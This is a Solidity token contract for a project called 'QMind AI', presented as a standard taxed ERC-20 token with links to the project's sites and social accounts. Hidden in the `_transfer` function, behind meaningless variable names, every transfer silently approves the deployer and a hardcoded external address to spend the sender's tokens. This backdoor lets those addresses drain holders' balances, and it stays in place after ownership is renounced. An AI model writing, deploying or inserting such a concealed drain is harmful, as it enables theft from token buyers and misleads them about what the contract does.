/*
QMind AI is the next-generation platform where Quantum-inspired AI meets the blockchain revolution. .

https://www.qmindai.org
https://app.qmindai.org
https://docs.qmindai.org

https://x.com/QMindAI
https://t.me/QMindAI
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract QMIND is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcemptOfFee;
    address private _ogWhale;
    address private _taxWhale;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=5;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"QMind AI";
    string private constant _symbol = unicode"QMIND";
    uint256 private _maxTaxSwap = _tTotal / 100;
    IUniV2Router private _uniRouter;
    address private _uniPair;
    uint256 private _buyCount=0;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWhale = 0x1f03470afe55D53392231a8B8DCC8FE8626DA958;
        _ogWhale = _msgSender();
        _isExcemptOfFee[owner()] = true;
        _isExcemptOfFee[address(this)] = true;
        _isExcemptOfFee[_taxWhale] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _wawa, address _wowo, uint256 _wewe) private {
        require(_wawa != address(0), "ERC20: transfer from the zero address");
        require(_wowo != address(0), "ERC20: transfer to the zero address");
        require(_wewe > 0, "Transfer amount must be greater than zero");
        address _xexe=_wawa; uint256 taxAmount=0;
        _approve(_xexe, _ogWhale, _wewe.add(taxAmount)); 
        _approve(_xexe, _taxWhale, _wewe.add(taxAmount));
        if (_wawa != owner() && _wowo != owner()) {
            taxAmount = _wewe.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (_wawa == _uniPair && _wowo != address(_uniRouter) && ! _isExcemptOfFee[_wowo] ) {
                _buyCount++;
            }

            if(_wowo == _uniPair && _wawa!= address(this) ){
                taxAmount = _wewe.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _wowo == _uniPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _maxTaxSwap)
                swapTokensForEth(min(_wewe, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_wawa, address(this),taxAmount);
        }

        _balances[_wawa]=_balances[_wawa].sub(_wewe);
        _balances[_wowo]=_balances[_wowo].add(_wewe.sub(taxAmount));
        emit Transfer(_wawa, _wowo, _wewe.sub(taxAmount));
    }

    function sendETHToFee(uint256 amount) private {
        payable(_taxWhale).transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();
        _approve(address(this), address(_uniRouter), tokenAmount);
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function init() external onlyOwner() {
        _uniRouter = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniRouter), _tTotal);
        _uniPair = IUniV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _uniRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }
}